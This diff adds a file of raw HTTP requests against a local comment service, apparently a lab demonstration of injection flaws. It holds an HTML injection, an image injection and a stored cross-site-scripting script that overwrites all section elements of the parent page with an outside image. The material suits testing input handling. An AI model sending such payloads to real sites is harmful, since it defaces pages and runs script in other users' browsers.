@@ -1,0 +1,30 @@
+POST http://localhost:8182/Service.svc/comment?name=mo HTTP/1.1
+Host: localhost:8182
+Content-Type: application/json
+Content-Length: 25
+
+"<h1>HTML Injection</h1>"
+
+-----------------------------------------------------------------------------------------
+POST http://localhost:8182/Service.svc/comment?name=mo HTTP/1.1
+Host: localhost:8182
+Content-Type: application/json
+Content-Length: 85
+
+"<img src=\"https://pbs.twimg.com/profile_images/722602576001171456/Z7D4lD7A.jpg\"/>"
+
+------------------------------------------------------------------------------------------
+POST http://localhost:8182/Service.svc/comment?name=mo HTTP/1.1
+Host: localhost:8182
+Content-Type: application/json
+Content-Length: 266
+
+"<script>var s = parent.document.getElementsByTagName(\"section\"); var img = document.createElement(\"img\");img.src = \"https://i.ytimg.com/vi/MM9-fJgoL4A/maxresdefault.jpg\";img.width=\"900\"; for(var i=0;i<s.length;i++){s[i].innerHTML = img.outerHTML;}</script>"
+
+
+
+
+
+
+
+
